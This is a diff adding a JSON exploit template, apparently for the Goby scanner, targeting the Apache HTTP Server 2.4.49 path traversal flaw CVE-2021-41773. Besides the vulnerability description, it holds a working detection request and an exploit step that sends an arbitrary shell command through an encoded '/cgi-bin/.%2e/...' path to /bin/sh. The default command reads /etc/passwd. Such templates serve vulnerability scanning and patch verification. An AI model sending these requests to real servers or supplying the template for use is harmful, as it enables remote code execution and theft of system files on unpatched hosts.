@@ -1,0 +1,97 @@
+{
+      "Name": "Apache HTTP Server 2.4.49 RCE CVE-2021-41773",
+      "Level": "2",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "product=\"Apache-Web-Server\" || company=\"Apache Software Foundation.\"",
+      "Description": "The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards.",
+      "Product": "Apache HTTP Server",
+      "Homepage": "http://httpd.apache.org/",
+      "Author": "",
+      "Impact": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration \"require all denied\", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.",
+      "Recommendation": "https://httpd.apache.org/security/vulnerabilities_24.html",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/cve-2021-41773",
+            "https://httpd.apache.org/security/vulnerabilities_24.html"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Command",
+                  "Type": "input",
+                  "Value": "A=|echo;cat /etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "A=|echo;echo CVE-2021-41773",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CVE-2021-41773",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "{{{Command}}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
